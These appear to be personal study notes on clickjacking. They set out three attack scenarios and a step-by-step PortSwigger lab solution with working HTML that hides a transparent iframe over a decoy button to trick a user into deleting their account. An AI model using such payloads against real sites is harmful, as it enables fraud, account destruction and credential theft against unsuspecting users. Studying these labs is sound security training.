clickjacking: https://portswigger.net/web-security/clickjacking#what-is-clickjacking

Labs path:  https://portswigger.net/web-security/all-labs#clickjacking

clickjacking preventions:- implement security headers like
### **Scenario 1: Stealing Credentials via Fake Login Page**

**Target:** Online Banking Users  
**Attack:**

1. The attacker creates a malicious website offering a free gift card.
2. The legitimate online banking login page is loaded inside an **invisible iframe**.
3. The attacker places a **fake login form** on top of the iframe, perfectly aligning with the original login fields.
4. When users try to enter their **username and password**, they are actually typing into the **attacker’s form**, which captures the credentials before redirecting the request to the bank’s original form to avoid suspicion.

**Impact:** The attacker steals login credentials, enabling unauthorized access to victims’ bank accounts.

---

### **Scenario 2: Unintended Money Transfer via Clickjacking**

**Target:** Users Authenticated to a Payment Website  
**Attack:**

1. The victim is already logged into their **payment portal** (e.g., PayPal, banking site).
2. The attacker sends the victim a link to an online quiz or a game, where the "Next" button is actually an **invisible transfer button** overlaid from the banking site (via iframe).
3. When the user clicks “Next” or any button in the game, it triggers a **hidden money transfer request**.

**Impact:** The victim unknowingly transfers money to the attacker’s account while believing they are just playing a game.

---

### **Scenario 3: Enabling Webcam & Microphone Access via Clickjacking**

**Target:** Users with Webcams (Google Meet, Zoom, etc.)  
**Attack:**

1. The attacker creates a fake **"Click to Watch Free Video"** page.
2. A transparent **iframe** of the browser’s camera/microphone permission popup is placed exactly over the "Play" button.
3. When the victim clicks "Play," they are unknowingly clicking the **"Allow Camera/Microphone"** button instead.
4. The attacker now has full access to the victim’s webcam and microphone.

**Impact:** The attacker can **spy on the victim** and capture sensitive conversations or footage.

# 1)Lab: Basic clickjacking with CSRF token protection

Lab: https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected
Lab Vid: https://www.youtube.com/watch?v=_tz0O5-cndE&ab_channel=Intigriti (at 5:35 min the conclusion of the lab explained)

This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: `wiener:peter`


#### Note

The victim will be using Chrome so test your exploit on that browser.


#### Solution
1. Log in to your account on the target website.
2. Go to the exploit server and paste the following HTML template into the **Body** section:
```
<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

1. Make the following adjustments to the template:
    - Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID.
    - Substitute suitable pixel values for the `$height_value` and `$width_value` variables of the iframe (we suggest 700px and 500px respectively).
    - Substitute suitable pixel values for the `$top_value` and `$side_value` variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).
    - Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
2. Click **Store** and then **View exploit**.
3. Hover over **Test me** and ensure the cursor changes to a hand indicating that the div element is positioned correctly. **Do not actually click the "Delete account" button yourself.** If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). If the div does not line up properly, adjust the `top` and `left` properties of the style sheet.
4. Once you have the div element lined up correctly, change "Test me" to "Click me" and click **Store**.
5. Click on **Deliver exploit to victim** and the lab should be solved.

**Analysis:**
iframe:- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe

CSS:- https://developer.mozilla.org/en-US/docs/Web/CSS

==click jacking code:==  for this lab
```
<style>

iframe{
position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;

}
div{
Position:absolute;
top:515px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src= "https://0aed002e0411e037808830210079002f.web-security-academy.net/my-account"></iframe>
```
